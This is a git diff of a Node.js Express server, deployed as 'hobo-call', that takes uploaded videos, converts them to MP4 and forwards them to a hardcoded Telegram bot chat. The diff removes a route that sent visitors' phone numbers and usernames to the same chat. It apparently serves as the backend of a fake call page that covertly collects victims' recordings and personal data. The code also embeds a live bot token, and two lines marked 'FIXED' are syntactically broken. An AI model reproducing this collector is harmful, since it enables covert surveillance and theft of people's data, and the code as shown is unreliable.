@@ -4,101 +4,140 @@ const fs = require("fs");
 const axios = require("axios");
 const FormData = require("form-data");
 const cors = require("cors");
+const ffmpeg = require("fluent-ffmpeg");
 
 const app = express();
 app.use(cors());
-app.use(express.json());
 
 // =====================
-// 📁 STORAGE
+// 📁 FILE STORAGE
 // =====================
-const upload = multer({ dest: "uploads/" });
+const storage = multer.diskStorage({
+    destination: "uploads/",
+    filename: (req, file, cb) => {
+        const ext = file.originalname.split(".").pop() || "webm";
+        cb(null, ${Date.now()}.${ext}); // ✅ FIXED
+    }
+});
+
+const upload = multer({ storage });
 
 // =====================
 // 🔑 CONFIG
 // =====================
-const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIREtQPUUTDVENOTXROc";
+const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
 const CHAT_ID = "8280326139";
 
 // =====================
-// ❤️ WAKE ROUTE
-// =====================
-app.get("/", (req, res) => {
-    res.send("Server is awake");
-});
-app.get("/debug", (req, res) => {
-    res.json({
-        token: BOT_TOKEN,
-        length: BOT_TOKEN?.length
-    });
-});
-
-// =====================
-// 📞 SEND PHONE + USERNAME
-// =====================
-app.post("/send-phone", async (req, res) => {
-    try {
-        const { phone, username } = req.body;
-
-        console.log("📞 Received:", phone, username);
-
-        await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-            {
-                chat_id: CHAT_ID,
-                text: `📞 New User\n👤 Username: ${username}\n📱 Phone: ${phone}`
-            }
-        );
-
-        res.send("Phone sent");
-
-    } catch (err) {
-        console.error("❌ Phone error:", err.response?.data || err.message);
-        res.status(500).send("Failed");
-    }
-});
-
-// =====================
-// 🎥 VIDEO UPLOAD (MP4 LABEL)
+// 🚀 UPLOAD ROUTE
 // =====================
 app.post("/upload", upload.single("video"), async (req, res) => {
+    let filePath;
+    let mp4Path;
+
     try {
-        console.log("FILE:", req.file);
+        console.log("\n==============================");
+        console.log("🚀 Upload received");
+
+        console.log("REQ FILE:", req.file);
+
+        if (!req.file) {
+            console.log("❌ No file uploaded");
+            return res.status(400).send("No file uploaded");
+        }
+
+        filePath = req.file.path;
+        mp4Path = filePath + ".mp4";
+
+        console.log("📁 File path:", filePath);
+        console.log("🎥 MIME type:", req.file.mimetype);
+
+        // =====================
+        // 🔄 FFmpeg conversion (safe)
+        // =====================
+        console.log("🔄 Starting FFmpeg conversion...");
+
+        await new Promise((resolve, reject) => {
+            ffmpeg(filePath)
+                .outputOptions([
+                    "-c:v libx264",
+                    "-preset ultrafast",
+                    "-pix_fmt yuv420p",
+                    "-c:a aac"
+                ])
+                .save(mp4Path)
+                .on("start", cmd => {
+                    console.log("🎬 FFmpeg command:");
+                    console.log(cmd);
+                })
+                .on("end", () => {
+                    console.log("✅ FFmpeg conversion complete");
+                    resolve();
+                })
+                .on("error", err => {
+                    console.error("❌ FFmpeg ERROR:", err.message);
+                    reject(err);
+                });
+        });
+
+        console.log("📦 Converted file:", mp4Path);
+
+        // =====================
+        // 📤 TELEGRAM UPLOAD
+        // =====================
+        console.log("📤 Sending to Telegram...");
+
+        const form = new FormData();
+
+        form.append("chat_id", CHAT_ID);
+
+        form.append("video", fs.createReadStream(mp4Path), {
+            filename: "specimen.mp4",
+            contentType: "video/mp4"
+        });
 
         const response = await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
-            {
-                chat_id: CHAT_ID,
-                video: fs.createReadStream(req.file.path)
-            },
-            {
-                headers: {
-                    "Content-Type": "multipart/form-data"
-                }
-            }
+            https://api.telegram.org/bot${BOT_TOKEN}/sendVideo, // ✅ FIXED
+            form,
+            { headers: form.getHeaders() }
         );
 
-        console.log("TELEGRAM:", response.data);
+        console.log("📨 Telegram response:", response.data);
 
-        fs.unlink(req.file.path, () => {});
+        // =====================
+        // 🧹 CLEANUP
+        // =====================
+        fs.unlinkSync(filePath);
+        fs.unlinkSync(mp4Path);
 
-        res.json(response.data);
+        console.log("🧹 Cleanup done");
+        console.log("==============================\n");
+
+        res.send("Upload successful");
 
     } catch (err) {
-        console.log("STATUS:", err.response?.status);
-        console.log("DATA:", err.response?.data);
-        res.status(500).json(err.response?.data || err.message);
+        console.error("\n❌ ERROR OCCURRED ❌");
+
+        console.error("Message:", err.message);
+
+        if (err.response?.data) {
+            console.error("Telegram/API error:", err.response.data);
+        }
+
+        try {
+            if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
+            if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
+        } catch (cleanupErr) {
+            console.error("Cleanup error:", cleanupErr.message);
+        }
+
+        res.status(500).send("Failed (check server logs)");
     }
 });
 
 // =====================
-// 🚀 START SERVER
+// 🌐 START SERVER
 // =====================
-const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, () => {
-    console.log("Server running on port " + PORT);
-    console.log("TOKEN RAW:", BOT_TOKEN);
-    console.log("TOKEN LENGTH:", BOT_TOKEN?.length);
-    
+app.listen(3000, () => {
+    console.log("Server running on https://hobo-call.onrender.com");
 });
